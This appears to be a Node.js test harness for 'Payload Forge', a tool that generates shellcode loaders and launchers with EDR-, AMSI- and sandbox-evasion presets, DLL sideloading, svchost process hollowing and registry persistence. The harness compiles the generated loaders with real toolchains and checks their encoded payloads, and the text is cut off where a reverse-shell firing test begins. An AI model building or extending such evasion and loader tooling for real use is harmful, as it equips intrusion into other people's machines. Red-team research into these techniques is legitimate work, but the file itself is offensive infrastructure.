#!/usr/bin/env node
/* =====================================================================
 * validate-builds.js — automated build validation harness for Payload Forge
 *
 * Loads the generator from payload-forge.html (headless, stubbed DOM),
 * produces every output the app can emit:
 *     5 presets (VANILLA / STATIC / SANDBOX / EDR / OPSEC)
 *   x 5 formats (C# .cs / PS1 / -ENC / VBS / HTA)
 * then validates each with the REAL Microsoft toolchain:
 *     - C#  : compile with .NET Framework csc.exe
 *     - PS1 : parse with the real PowerShell language parser
 *     - -ENC/VBS/HTA : extract the embedded powershell -Enc blob,
 *                      decode UTF-16LE, and parse THAT body
 * plus a session-persistence round-trip test (save → fresh context → restore)
 * and corrupt-blob fallback.
 *
 * Usage:  node validate-builds.js
 * Output: _hv/out/*  (generated artifacts) + a pass/fail matrix on stdout
 * ===================================================================== */
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { execFileSync } = require('child_process');

const ROOT = path.join(__dirname, '..');          // repo root (tests/ parent)
const HTML = fs.readFileSync(path.join(ROOT, 'payload-forge.html'), 'utf8');
const SCRIPT = HTML.match(/<script>([\s\S]*?)<\/script>/)[1];
const OUT = path.join(__dirname, 'out');           // artifacts land in tests/out/
const CSC = fs.existsSync('C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe')
  ? 'C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe'
  : 'csc.exe';   // fall back to PATH (e.g. newer SDK csc)
const PWSH = 'powershell.exe';
const VBSHELPER = path.join(__dirname, 'vbs-parse.ps1');
const HAS_BASH = (() => { try { execFileSync('bash', ['--version'], { stdio: 'ignore' }); return true; } catch { return false; } })();

// The 15-byte msfvenom-style payload used to exercise the shellcode-runner path.
const SHELL_HEX = 'fc4883e4f0e8c00000004151415052';

/* ---------------------------------------------------------------------
 * Storage stub — stateful, so saveState/restoreState work headlessly
 * --------------------------------------------------------------------- */
const makeStubSS = () => {
  const store = {};
  return {
    store,
    getItem: k => (k in store ? store[k] : null),
    setItem: (k, v) => { store[k] = String(v); },
    removeItem: k => { delete store[k]; },
  };
};

/* ---------------------------------------------------------------------
 * DOM stub — everything the app's render functions touch, as inert objects
 * --------------------------------------------------------------------- */
const makeEl = () => ({
  value: '', textContent: '', innerHTML: '',
  style: {}, dataset: {}, files: null, _h: 0,
  classList: { add(){}, remove(){}, toggle(){}, contains: () => false },
  addEventListener(){}, removeEventListener(){}, appendChild(){}, remove(){},
  querySelector: () => makeEl(), querySelectorAll: () => [],
  getBoundingClientRect: () => ({ left: 0, width: 100 }),
  closest: () => makeEl(), matches: () => false, click(){},
  set onclick(f){}, set onchange(f){},
});

/* Expose the app's internals after the script runs */
const BOOTSTRAP = `
;globalThis.__PF = {
  applyPreset, update, buildCS, buildPS, buildLauncher, PRESETS, TECH, S, SLHOSTS,
  saveState, restoreState,
  setShell: v => { els.shell.value = v; },
  setLhost: v => { els.lhost.value = v; },
  setLport: v => { els.lport.value = v; },
  getCur: () => cur.code,
};`;

/* ---------------------------------------------------------------------
 * Evaluate the app script headlessly in a fresh context
 * --------------------------------------------------------------------- */
const makeSandbox = (ss) => {
  const els = {};                                   // registry so we can inject values
  const stubDoc = {
    getElementById: id => (els[id] = els[id] || makeEl()),
    createElement: () => makeEl(),
    querySelector: () => makeEl(),
    querySelectorAll: () => [],
    addEventListener(){}, removeEventListener(){},
    documentElement: { style: { setProperty(){} } },
  };
  const stubWin = {
    addEventListener(){}, removeEventListener(){},
    devicePixelRatio: 1,
  };
  const sandbox = {
    document: stubDoc, window: stubWin, navigator: {},
    sessionStorage: ss, localStorage: ss,
    btoa: s => Buffer.from(s, 'binary').toString('base64'),
    atob: s => Buffer.from(s, 'base64').toString('binary'),
    TextEncoder, TextDecoder,
    Blob: class { constructor(){ this.size = 0; } },
    URL: { createObjectURL: () => 'blob:stub', revokeObjectURL(){} },
    performance: { now: () => Date.now() },
    requestAnimationFrame: () => 0, cancelAnimationFrame(){},
    setTimeout: (fn) => 0, clearTimeout(){}, setInterval: () => 0, clearInterval(){},
    console, Math, Date, JSON, Promise, Array, Object, String, Number, Boolean, RegExp, Error,
    __PF: null, els,
  };
  sandbox.globalThis = sandbox;
  sandbox.window = stubWin;
  const ctx = vm.createContext(sandbox);
  vm.runInContext(SCRIPT + BOOTSTRAP, ctx, { filename: 'payload-forge.html' });
  return { PF: sandbox.__PF, els };
};

const stubSS = makeStubSS();
const { PF, els } = makeSandbox(stubSS);

/* ---------------------------------------------------------------------
 * Generate every combination
 * --------------------------------------------------------------------- */
fs.mkdirSync(OUT, { recursive: true });
const FORMATS = ['cs', 'ps1', 'enc', 'vbs', 'hta', 'dll', 'dllh', 'mac', 'and'];
const FMT_KEY = { cs:'cs', ps1:'ps', enc:'ps', vbs:'ps', hta:'ps', dll:'dll', dllh:'dll', mac:'c', and:'java' };
const VCVARS = 'C:/Program Files/Microsoft Visual Studio/18/Community/VC/Auxiliary/Build/vcvars64.bat';
const HAS_MSVC = fs.existsSync(VCVARS);
const meta = {};

const genErrors = [];
function build(presetId, fmt, wrapper) {
  PF.S.plat = fmt === 'mac' ? 'mac' : fmt === 'and' ? 'android' : 'win';
  PF.applyPreset(presetId);                 // sets S.checks (+fmt/inj/persist per platform)
  PF.setShell(SHELL_HEX);                   // shellcode-embedded (runner) builds
  PF.setLhost('10.10.10.10');
  PF.setLport('4444');

  if (fmt === 'cs')  { PF.S.fmt = 'cs';   PF.S.wrapper = 'none'; }
  else if (fmt === 'dll' || fmt === 'dllh') { PF.S.fmt = 'dll'; PF.S.wrapper = 'none'; PF.S.sl.exec = fmt === 'dllh' ? 'hollow' : 'self'; els['sel-slexec'] = els['sel-slexec'] || makeEl(); els['sel-slexec'].value = PF.S.sl.exec; }
  else if (fmt === 'mac') { PF.S.fmt = 'c';    PF.S.wrapper = 'none'; }
  else if (fmt === 'and') { PF.S.fmt = 'java'; PF.S.wrapper = 'none'; }
  else              { PF.S.fmt = 'ps';   PF.S.wrapper = fmt === 'ps1' ? 'none' : fmt; }
  if (wrapper) PF.S.wrapper = wrapper;      // launcher-chain variant (mac .sh/.app, android build.sh)

  PF.update();
  let full = PF.getCur();

  // Guard against a silent generator regression: an empty payload would parse
  // "clean" in PowerShell (empty file = zero errors) and falsely PASS.
  if (!full || !full.trim()) genErrors.push(`${presetId} ${fmt}: generator returned empty output`);

  let code = full, launcher = null;
  const marker = '\n\n// --- launcher ---\n';
  const mi = full.indexOf(marker);
  if (mi >= 0) { code = full.slice(0, mi); launcher = full.slice(mi + marker.length); }

  const key = `${presetId}|${fmt}${wrapper ? '-' + wrapper : ''}`;
  const dir = path.join(OUT, `${presetId}-${fmt}${wrapper ? '-' + wrapper : ''}`);
  fs.mkdirSync(dir, { recursive: true });
  if (fmt === 'cs')      fs.writeFileSync(path.join(dir, 'Program.cs'), code);
  else if (fmt === 'dll' || fmt === 'dllh'){
    for (const f of splitSections(code)) fs.writeFileSync(path.join(dir, f.name), f.content);
  }
  else if (fmt === 'mac'){ fs.writeFileSync(path.join(dir, 'loader.c'), code);
                           if (launcher) fs.writeFileSync(path.join(dir, 'launcher.txt'), launcher); }
  else if (fmt === 'and'){ fs.writeFileSync(path.join(dir, 'MainActivity.java'), code);
                           if (launcher) fs.writeFileSync(path.join(dir, 'launcher.txt'), launcher); }
  else { fs.writeFileSync(path.join(dir, 'body.ps1'), code);
         if (launcher) fs.writeFileSync(path.join(dir, 'launcher.txt'), launcher); }
  // count only checks that actually apply to this output format (mirrors updateMeters)
  const techKey = FMT_KEY[fmt];
  const techCount = Object.keys(PF.S.checks).filter(k => PF.S.checks[k] &&
    PF.TECH[k].apply.includes(techKey)).length;
  meta[key] = { presetId, fmt, bytes: code.length, techCount };
}

for (const p of PF.PRESETS) for (const f of FORMATS) build(p.id, f);

// launcher-chain variants for the native formats (mac .sh / .app, android build.sh)
for (const [fmt, w] of [['mac', 'sh'], ['mac', 'app'], ['and', 'build']])
  for (const p of PF.PRESETS) build(p.id, fmt, w);

/* ---------------------------------------------------------------------
 * Session persistence round-trip
 * --------------------------------------------------------------------- */
const restoreErrors = [];
(function () {
  // 1. set a distinctive state in the main context and persist it
  PF.S.plat = 'win';
  PF.S.fmt = 'cs'; PF.S.wrapper = 'vbs'; PF.S.stage = 'staged';
  PF.S.shell = SHELL_HEX; PF.S.lhost = '10.0.0.99'; PF.S.lport = 7777;
  PF.S.checks = { amsi: true, etw: true, antivm: true };
  PF.S.persist = 'regkey'; PF.S.amsimode = 'reflect';
  PF.saveState();
  const blob = stubSS.store['pf_state_v1'];
  if (!blob) { restoreErrors.push('saveState produced no stored blob'); return; }

  // 2. fresh context + same storage = a page reload; restore must rebuild state
  const { PF: PF2, els: els2 } = makeSandbox(stubSS);
  const restored = PF2.restoreState();
  if (!restored) restoreErrors.push('restoreState returned false with a valid blob');
  const got = {
    fmt: PF2.S.fmt, wrapper: PF2.S.wrapper, stage: PF2.S.stage,
    shell: PF2.S.shell, lhost: PF2.S.lhost, lport: PF2.S.lport,
    persist: PF2.S.persist, amsimode: PF2.S.amsimode,
    checks: JSON.stringify(Object.keys(PF2.S.checks).filter(k => PF2.S.checks[k]).sort()),
    shellInput: els2.shell.value, lhostInput: els2.lhost.value,
  };
  const want = {
    fmt: 'cs', wrapper: 'vbs', stage: 'staged', shell: SHELL_HEX,
    lhost: '10.0.0.99', lport: 7777, persist: 'regkey', amsimode: 'reflect',
    checks: JSON.stringify(['amsi', 'antivm', 'etw']),
    shellInput: SHELL_HEX, lhostInput: '10.0.0.99',
  };
  for (const k of Object.keys(want)) {
    if (String(got[k]) !== String(want[k]))
      restoreErrors.push(`restore mismatch ${k}: got ${JSON.stringify(got[k])}, want ${JSON.stringify(want[k])}`);
  }

  // 3. corrupt blob must fall back to defaults (false), not throw or stick
  stubSS.setItem('pf_state_v1', '{not json');
  const { PF: PF3 } = makeSandbox(stubSS);
  const r3 = PF3.restoreState();
  if (r3 !== false) restoreErrors.push('corrupt blob: restoreState should return false, got ' + r3);
  if (stubSS.getItem('pf_state_v1') !== null) restoreErrors.push('corrupt blob: stored blob should be dropped on failure');
})();

/* ---------------------------------------------------------------------
 * Wrapper negative control — the real parser must catch broken VBScript
 * --------------------------------------------------------------------- */
const wrapperNegErrors = [];
(function () {
  const negVbs = path.join(OUT, '_neg', 'broken.vbs');
  fs.mkdirSync(path.dirname(negVbs), { recursive: true });
  fs.writeFileSync(negVbs, 'If Then\nDim x = (1 +\n');
  const r = vbsParse([negVbs]);
  const lines = r.out.trim().split(/\r?\n/).filter(Boolean);
  const detected = lines.some(l => l.startsWith('FAIL') || l.startsWith('SKIP'));
  if (!detected) wrapperNegErrors.push('broken VBScript was NOT detected by the real parser');
  fs.rmSync(path.dirname(negVbs), { recursive: true, force: true });
})();

/* ---------------------------------------------------------------------
 * Validators
 * --------------------------------------------------------------------- */
const results = [];
const cscFlags = ['-nologo', '-noconfig', '-r:System.dll', '-platform:x64', '-optimize+'];

function run(cmd, args) {
  try {
    const out = execFileSync(cmd, args, { encoding: 'utf8', stdio: ['ignore','pipe','pipe'], timeout: 60000 });
    return { ok: true, out };
  } catch (e) {
    return { ok: false, out: (e.stdout || '') + (e.stderr || '') };
  }
}
// cmd.exe /c with nested quotes — Node's argv quoting would mangle them, so pass verbatim
function runCmd(cmdStr, cwd) {
  const opts = { encoding: 'utf8', stdio: ['ignore','pipe','pipe'], timeout: 120000, windowsVerbatimArguments: true };
  if (cwd) opts.cwd = cwd;
  try {
    const out = execFileSync('cmd.exe', ['/d', '/c', cmdStr], opts);
    return { ok: true, out };
  } catch (e) {
    return { ok: false, out: (e.stdout || '') + (e.stderr || '') };
  }
}

function psParse(files) {
  // one powershell invocation, parser reports each file
  const ps = [
    "$ErrorActionPreference = 'Stop'",
    "foreach ($f in $args) {",
    "  $e = $null; $t = $null",
    "  [void][System.Management.Automation.Language.Parser]::ParseFile($f, [ref]$t, [ref]$e)",
    "  if ($e.Count) { Write-Output ('FAIL ' + $f + ' :: ' + (($e | ForEach-Object { $_.Message }) -join ' | ')) }",
    "  else { Write-Output ('OK ' + $f) }",
    "}",
  ].join('\n');
  const cmd = `& { ${ps} } ${files.map(f => "'" + f.replace(/'/g, "''") + "'").join(' ')}`;
  return run(PWSH, ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', cmd]);
}

function decodeEncB64(b64) {
  return Buffer.from(b64, 'base64').toString('utf16le');
}

function extractEncBlob(text) {
  const m = text.match(/-Enc\s+([A-Za-z0-9+/=]+)/);
  return m ? m[1] : null;
}

/* --- VBScript / HTA wrapper syntax ---------------------------------- */
function vbsParse(files) {
  // one powershell invocation; _vbs-parse.ps1 prints OK/FAIL/SKIP per file
  return run(PWSH, ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', VBSHELPER, ...files]);
}

// The generated HTA must carry the full document skeleton in order and closed.
// Note: indexOf('</script>') also matches INSIDE the escaped '\</script>' form,
// so a backslash immediately before the closer is rejected explicitly.
function checkHtaStructure(html) {
  const order = ['<html', '<head', '<title', '</title>', '</head>', '<body', '<script', '</script>', '</body>', '</html>'];
  let idx = -1;
  for (const tag of order) {
    const i = html.toLowerCase().indexOf(tag.toLowerCase());
    if (i < 0 || i <= idx) return false;   // missing or out of order
    if (tag === '</script>' && html[i - 1] === '\\') return false;  // escaped closer = broken HTA
    idx = i;
  }
  return true;
}

function extractHtaScript(html) {
  const m = html.match(/<script[^>]*>([\s\S]*?)<\/script>/i);
  return m ? m[1] : null;
}

// --- C# compile -------------------------------------------------------
const csDirs = fs.readdirSync(OUT).filter(d => d.endsWith('-cs'));
for (const d of csDirs) {
  const cs = path.join(OUT, d, 'Program.cs');
  const exe = path.join(OUT, d, '_t.exe');
  const r = run(CSC, [...cscFlags, `-out:${exe}`, cs]);
  results.push({ preset: d.replace('-cs',''), fmt: 'cs', pass: r.ok,
                 detail: r.ok ? 'compiled OK' : (r.out.split('\n').filter(l=>l.includes('error')).join(' | ')) });
}

// --- PS1 --------------------------------------------------------------
const ps1Dirs = fs.readdirSync(OUT).filter(d => d.endsWith('-ps1'));
for (const d of ps1Dirs) {
  const r = psParse([path.join(OUT, d, 'body.ps1')]);
  results.push({ preset: d.replace('-ps1',''), fmt: 'ps1', pass: r.ok && r.out.includes('OK '),
                 detail: r.out.trim() });
}

// --- -ENC / VBS / HTA ------------------------------------------------
for (const f of ['enc', 'vbs', 'hta']) {
  const dirs = fs.readdirSync(OUT).filter(d => d.endsWith('-' + f));
  for (const d of dirs) {
    const preset = d.replace('-' + f, '');
    const launchPath = path.join(OUT, d, 'launcher.txt');
    const launch = fs.readFileSync(launchPath, 'utf8');
    const blob = extractEncBlob(launch);
    let pass = !!blob, detail = blob ? '' : 'no -Enc blob found in launcher';
    let decoded = null;
    if (blob) {
      try { decoded = decodeEncB64(blob); }
      catch (e) { pass = false; detail = 'decode failed: ' + e.message; }
    }
    if (decoded) {
      const bodyPath = path.join(OUT, d, 'decoded.ps1');
      fs.writeFileSync(bodyPath, decoded);
      const r = psParse([bodyPath]);
      pass = pass && r.ok && r.out.includes('OK ');
      detail = detail + (r.out.trim());
      // buildLauncher(code) wraps the exact body — decoded -Enc must equal body.ps1
      const bodyPs1 = fs.readFileSync(path.join(OUT, d, 'body.ps1'), 'utf8');
      if (decoded !== bodyPs1) { pass = false; detail += ' | WARN: decoded -Enc != body.ps1'; }
    }
    // wrapper layer itself: the VBScript that hands off to powershell -Enc
    let wrapperFiles = [];
    if (f === 'vbs') {
      wrapperFiles = [launchPath];
    } else if (f === 'hta') {
      const htmlOk = checkHtaStructure(launch);
      detail += ' | html: ' + (htmlOk ? 'structure OK' : 'STRUCTURE FAIL');
      pass = pass && htmlOk;
      const script = extractHtaScript(launch);
      if (script) {
        const wPath = path.join(OUT, d, 'wrapper.vbs');
        fs.writeFileSync(wPath, script);
        wrapperFiles = [wPath];
      } else {
        pass = false;
        detail += ' | wrapper: no VBScript block found';   // would mean a malformed script tag
      }
    }
    if (wrapperFiles.length) {
      const r = vbsParse(wrapperFiles);
      const lines = r.out.trim().split(/\r?\n/).filter(Boolean);
      const ok = r.ok && lines.length === wrapperFiles.length && lines.every(l => l.startsWith('OK '));
      pass = pass && ok;
      detail += ' | wrapper: ' + (ok ? 'VBScript parse OK' : (r.out.trim() || 'parser invocation failed'));
    }
    results.push({ preset, fmt: f, pass, detail: detail.trim() || 'OK' });
  }
}

/* --- C (macOS Mach-O loader) / Java (Android) / DLL sideload ---------- */
function splitSections(body){
  // mirror the app's curFiles(): /* ===== NAME ===== */ markers, name strips (suffix)
  const re = /\/\* ={5,} ([^*]+?) ={5,} \*\/\s*/g;
  const files = [];
  let cur = { name: null, content: '' };
  let last = 0, m;
  while ((m = re.exec(body))){
    cur.content += body.slice(last, m.index);
    if (cur.name) files.push(cur);
    cur = { name: m[1].trim().replace(/\s*\([^)]*\)\s*$/, ''), content: '' };
    last = re.lastIndex;
  }
  cur.content += body.slice(last);
  files.push(cur);
  return files.filter(f => f.content.trim().length > 0);
}
function extractMacBlob(c) {
  const m = c.match(/static const unsigned char blob\[\]\s*=\s*\{([\s\S]*?)\};/);
  if (!m) return null;
  const bytes = []; const re = /0x([0-9a-fA-F]{2})/g; let x;
  while ((x = re.exec(m[1]))) bytes.push(parseInt(x[1], 16));
  return bytes;
}
function extractMacKey(c) {
  const m = c.match(/const char\* key = "([^"]+)"/);
  return m ? m[1] : null;
}
function extractAndEnc(j) {
  const m = j.match(/Base64\.decode\("([A-Za-z0-9+/=]+)", Base64\.DEFAULT\)/);
  return m ? m[1] : null;
}
function extractAndKey(j) {
  const m = j.match(/String k = "([^"]+)"/);
  return m ? m[1] : null;
}
// XOR the key-encrypted payload back and compare against the source hex.
// This proves the embedded payload round-trips through key + encoder.
function xorMatches(blob, key, expectedHex) {
  if (!Array.isArray(blob) || !blob.length || !key)
    return { ok: false, msg: 'embedded payload/key not found' };
  let s = '';
  for (let i = 0; i < blob.length; i++)
    s += (blob[i] ^ key.charCodeAt(i % key.length)).toString(16).padStart(2, '0');
  return s.toLowerCase() === expectedHex.toLowerCase()
    ? { ok: true, msg: `round-trip OK (${blob.length} B)` }
    : { ok: false, msg: `round-trip MISMATCH (decoded ${s.length / 2} B vs source ${expectedHex.length / 2} B)` };
}

// --- macOS loader.c ---
for (const d of fs.readdirSync(OUT).filter(x => x.includes('-mac') && fs.existsSync(path.join(OUT, x, 'loader.c')))) {
  const preset = d.split('-mac')[0];
  const c = fs.readFileSync(path.join(OUT, d, 'loader.c'), 'utf8');
  let pass = c.includes('int main(int argc, char** argv)') && c.includes('mmap(') && c.includes('PROT_EXEC');
  let detail = pass ? '' : 'missing structure (main / mmap / PROT_EXEC)';
  if (pass) {
    const rt = xorMatches(extractMacBlob(c), extractMacKey(c), SHELL_HEX);
    pass = rt.ok; detail = rt.msg;
  }
  results.push({ preset, fmt: 'mac', pass, detail: detail || 'OK' });
}

// --- Android MainActivity.java ---
for (const d of fs.readdirSync(OUT).filter(x => x.includes('-and') && fs.existsSync(path.join(OUT, x, 'MainActivity.java')))) {
  const preset = d.split('-and')[0];
  const j = fs.readFileSync(path.join(OUT, d, 'MainActivity.java'), 'utf8');
  let pass = /public class MainActivity extends Activity/.test(j) &&
    j.includes('System.loadLibrary') && /private native void/.test(j) &&
    j.includes('Base64.decode') && /package com\.\w+\.\w+;/.test(j);
  let detail = pass ? '' : 'missing structure (class / JNI / package)';
  if (pass) {
    const enc = extractAndEnc(j);
    if (!enc) { pass = false; detail = 'no Base64 payload found'; }
    else {
      const bytes = [...Buffer.from(enc, 'base64')];
      const rt = xorMatches(bytes, extractAndKey(j), SHELL_HEX);
      pass = rt.ok; detail = rt.msg;
    }
  }
  results.push({ preset, fmt: 'and', pass, detail: detail || 'OK' });
}

// --- DLL sideload (C, compiled with the REAL MSVC cl.exe) ------------
// Both execution modes: in-process runner (-dll) and the hollow-svchost
// combo (-dllh, T1055.012). Structure checks assert each mode carries its
// machinery and NOT the other's.
for (const d of fs.readdirSync(OUT).filter(x => x.includes('-dll') && fs.existsSync(path.join(OUT, x, 'sideload.c')))) {
  const isHollow = d.endsWith('-dllh');
  const preset = d.split('-dll')[0];
  const fmt = isHollow ? 'dllh' : 'dll';
  const dir = path.join(OUT, d);
  const c = fs.readFileSync(path.join(dir, 'sideload.c'), 'utf8');
  let pass;
  if (isHollow){
    /* current hollow machinery (ASLR-fixed): PEB+0x10 base read, entry-overwrite,
       and the parameter block (pb[0x28] sockaddr) that replaces the PEB-walk so
       the shellcode carries no resolution signature */
    pass = c.includes('DllMain(HINSTANCE') && c.includes('GetProcAddress') &&
      c.includes('CREATE_SUSPENDED') && c.includes('svchost.exe') &&
      c.includes('pVPE(') && c.includes('pRPr(') && c.includes('PebBaseAddress') &&
      c.includes('PAGE_EXECUTE_READWRITE') && c.includes('pb[0x28]');
  } else {
    pass = c.includes('DllMain(HINSTANCE') && c.includes('PAGE_EXECUTE_READ') &&
      c.includes('GetProcAddress') && !c.includes('CREATE_SUSPENDED') &&
      !c.includes('pNU(');   // self-runner must NOT carry the hollow machinery
  }
  let detail = pass ? '' : 'missing structure (' + (isHollow ? 'hollow' : 'self') + ' mode: DllMain / exec path / resolution)';
  if (pass) {
    const rt = xorMatches(extractMacBlob(c), extractMacKey(c), SHELL_HEX);
    pass = rt.ok; detail = rt.msg;
  }
  const dep = path.join(dir, 'deploy.ps1');
  let deployOk = false, deployDetail = '';
  if (fs.existsSync(dep)){
    const rp = psParse([dep]);
    deployOk = rp.ok && rp.out.includes('OK ');
    deployDetail = ' | deploy.ps1: ' + (deployOk ? 'PowerShell parse OK' : 'PARSE FAIL');
    // the no-DllMain export probe must be present (0x1 = DONT_RESOLVE_DLL_REFERENCES;
    // 0x20 AS_IMAGE_RESOURCE cannot resolve exports via GetProcAddress on Win11)
    if (deployOk){
      const dt = fs.readFileSync(dep, 'utf8');
      if (dt.includes('$requiredExports = @(') && !(dt.includes('LoadLibraryEx') && dt.includes(', 0x1)') && dt.includes('GetProcAddress'))){
        deployOk = false;
        deployDetail = ' | deploy.ps1: EXPORT PROBE MISSING (need LoadLibraryEx 0x1 + GetProcAddress)';
      }
    }
  } else {
    deployDetail = ' | deploy.ps1: MISSING';
  }
  const bc = path.join(dir, 'build.cmd');
  let bcOk = false, bcDetail = '';
  if (fs.existsSync(bc)){
    const bt = fs.readFileSync(bc, 'utf8');
    bcOk = bt.includes('sideload.c') && bt.includes('%DLLNAME%') && bt.includes('ws2_32');
    // builds with an export table must carry the build-time export self-check
    if (bcOk && fs.existsSync(path.join(dir, 'sideload.def')))
      bcOk = bt.includes('export self-check') && bt.includes('dumpbin /exports %DLLNAME%');
    bcDetail = ' | build.cmd: ' + (bcOk ? 'structure OK' : 'MISSING refs');
  } else bcDetail = ' | build.cmd: MISSING';
  // verify-host.ps1: real PowerShell parse + per-host import name baked in
  const vh = path.join(dir, 'verify-host.ps1');
  let vhOk = false, vhDetail = '';
  if (fs.existsSync(vh)){
    const vhText = fs.readFileSync(vh, 'utf8');
    const rp2 = psParse([vh]);
    const wantDll = 'msscntrs.dll';   // default search host for the preset matrix
    vhOk = rp2.ok && rp2.out.includes('OK ') && vhText.includes('function Get-PeImports') &&
      vhText.includes('$Import = "' + wantDll + '"') && vhText.includes('Get-AuthenticodeSignature');
    vhDetail = ' | verify-host.ps1: ' + (vhOk ? 'parse OK + import ref' : 'FAIL');
  } else vhDetail = ' | verify-host.ps1: MISSING';
  if (pass && HAS_MSVC){
    const winDir = dir.replace(/\//g, '\\');
    const defExists = fs.existsSync(path.join(dir, 'sideload.def'));
    const defArg = defExists ? ' sideload.def' : '';
    const r = runCmd('call "' + VCVARS + '" >nul 2>&1 && cl /nologo /W1 /LD /O2 /Fe:out.dll sideload.c' + defArg + ' ws2_32.lib', winDir);
    if (!r.ok){
      pass = false;
      detail += ' | MSVC compile: FAIL — ' + r.out.split(/\r?\n/).filter(l => /error C\d+/.test(l)).slice(0, 3).join(' ; ');
    } else {
      detail += ' | MSVC compile: OK';
      if (defExists){
        const dr = runCmd('call "' + VCVARS + '" >nul 2>&1 && dumpbin /exports out.dll', winDir);
        const exp = dr.ok ? dr.out : '';
        const defNames = fs.readFileSync(path.join(dir, 'sideload.def'), 'utf8')
          .split(/\r?\n/).filter(l => /^\s+\S/.test(l)).map(l => l.trim().split(/\s+/)[0]);
        const missing = defNames.filter(n => !new RegExp('\\b' + n + '\\b').test(exp));
        if (missing.length){ pass = false; detail += ' | exports MISSING: ' + missing.join(','); }
        else detail += ' | exports: ' + defNames.length + '/' + defNames.length + ' in PE';        
      }
      try { fs.rmSync(path.join(dir, 'out.dll')); fs.rmSync(path.join(dir, 'out.lib')); fs.rmSync(path.join(dir, 'out.exp')); fs.rmSync(path.join(dir, 'sideload.obj')); } catch(_){}
    }
  } else if (pass){
    detail += ' | (MSVC not present — structural check only)';
  }
  results.push({ preset, fmt, pass: pass && deployOk && bcOk && vhOk, detail: (detail || 'OK') + deployDetail + bcDetail + vhDetail });
}

// --- DLL host sweep: EVERY SIDELOAD TARGET compiles with the real MSVC and
// its full export table lands in the PE. Covers the verified version.dll
// family + magnification.dll. Reads the app's own SLHOSTS as source of truth
// and asserts the generated header, deploy.ps1 origin handling, shellcode
// round-trip, MSVC compile, dumpbin export table, and PowerShell parse.
const HOST_SWEEP = ['cert','whoami','msconfig','winsat','agentservice','sfc','cscript','wscript','sigcheck','onedrive','magnify'];
const hostSweepResults = [];
for (const hid of HOST_SWEEP) {
  const dir = path.join(OUT, '_hostsweep-' + hid);
  fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(dir, { recursive: true });
  PF.S.plat = 'win'; PF.S.fmt = 'dll'; PF.S.wrapper = 'none';
  PF.S.sl.exec = 'self'; PF.S.sl.host = hid; PF.S.checks = {};
  els['sel-slhost'] = els['sel-slhost'] || makeEl(); els['sel-slhost'].value = hid;
  els['sel-slexec'] = els['sel-slexec'] || makeEl(); els['sel-slexec'].value = 'self';
  PF.update();
  PF.setShell(SHELL_HEX); PF.setLhost('10.10.10.10'); PF.setLport('4444');
  PF.update();
  for (const f of splitSections(PF.getCur())) fs.writeFileSync(path.join(dir, f.name), f.content);
  const h = PF.SLHOSTS[hid];
  const c = fs.readFileSync(path.join(dir, 'sideload.c'), 'utf8');
  const dep = fs.readFileSync(path.join(dir, 'deploy.ps1'), 'utf8');
  let pass = c.includes('Host: ' + h.exe) && c.includes('loads "' + h.dll + '"');
  let detail = pass ? '' : 'header host/dll mismatch';
  if (pass && !dep.includes("$hostName = '" + h.exe + "'")) { pass = false; detail = 'deploy.ps1 $hostName mismatch'; }
  if (pass && h.origin === 'localappdata' && !dep.includes('LOCALAPPDATA')) { pass = false; detail = 'deploy.ps1 missing LOCALAPPDATA origin'; }
  if (pass && h.origin === 'local' && !dep.includes('$PSScriptRoot')) { pass = false; detail = 'deploy.ps1 missing operator-provided origin'; }
  if (pass) {
    const rt = xorMatches(extractMacBlob(c), extractMacKey(c), SHELL_HEX);
    pass = rt.ok; detail = rt.msg;
  }
  const rp = psParse([path.join(dir, 'deploy.ps1')]);
  const deployOk = rp.ok && rp.out.includes('OK ');
  if (!deployOk) { pass = false; detail += ' | deploy.ps1: PARSE FAIL'; }
  if (deployOk && !(dep.includes('$requiredExports = @(') && dep.includes('LoadLibraryEx') && dep.includes(', 0x1)') && dep.includes('GetProcAddress'))){
    pass = false; detail += ' | deploy.ps1: EXPORT PROBE MISSING (LoadLibraryEx 0x1 + GetProcAddress)'; }
  else if (deployOk) { detail += ' | export probe: OK'; }
  const vh = path.join(dir, 'verify-host.ps1');
  if (!fs.existsSync(vh)) { pass = false; detail += ' | verify-host.ps1: MISSING'; }
  else {
    const vhText = fs.readFileSync(vh, 'utf8');
    const rpv = psParse([vh]);
    const vhOk = rpv.ok && rpv.out.includes('OK ') && vhText.includes('function Get-PeImports') &&
      vhText.includes('$Import = "' + h.dll + '"') && vhText.includes('Get-AuthenticodeSignature');
    if (!vhOk) { pass = false; detail += ' | verify-host.ps1: FAIL (parse or import ref)'; }
    else detail += ' | verify-host.ps1: OK';
  }
  if (pass && HAS_MSVC){
    const winDir = dir.replace(/\//g, '\\');
    const r = runCmd('call "' + VCVARS + '" >nul 2>&1 && cl /nologo /W1 /LD /O2 /Fe:out.dll sideload.c sideload.def ws2_32.lib', winDir);
    if (!r.ok){
      pass = false;
      detail += ' | MSVC compile: FAIL — ' + r.out.split(/\r?\n/).filter(l => /error C\d+/.test(l)).slice(0, 3).join(' ; ');
    } else {
      const dr = runCmd('call "' + VCVARS + '" >nul 2>&1 && dumpbin /exports out.dll', winDir);
      const exp = dr.ok ? dr.out : '';
      const defNames = fs.readFileSync(path.join(dir, 'sideload.def'), 'utf8')
        .split(/\r?\n/).filter(l => /^\s+\S/.test(l)).map(l => l.trim().split(/\s+/)[0]);
      const missing = defNames.filter(n => !new RegExp('\\b' + n + '\\b').test(exp));
      if (missing.length){ pass = false; detail += ' | exports MISSING: ' + missing.join(','); }
      else detail += ' | exports: ' + defNames.length + '/' + defNames.length + ' in PE';
      try { fs.rmSync(path.join(dir, 'out.dll')); fs.rmSync(path.join(dir, 'out.lib')); fs.rmSync(path.join(dir, 'out.exp')); fs.rmSync(path.join(dir, 'sideload.obj')); } catch(_){}
    }
  } else if (pass){
    detail += ' | (MSVC not present — structural check only)';
  }
  hostSweepResults.push({ hid, pass, detail: detail || 'OK' });
}

// --- DLL runtime firing check (REAL execution, loopback only) -------------
// Loads the compiled DLL via LoadLibrary in a real PowerShell process and
// requires the payload thread to fire a TCP connect-back. Compile checks
// cannot catch what this catches: RES() resolving user32 APIs from kernel32
// (every DLL build silently dead), or cmd.exe given non-pipe stdio (shell
// connects but never speaks).
const dllRuntimeErrors = [];
(function () {
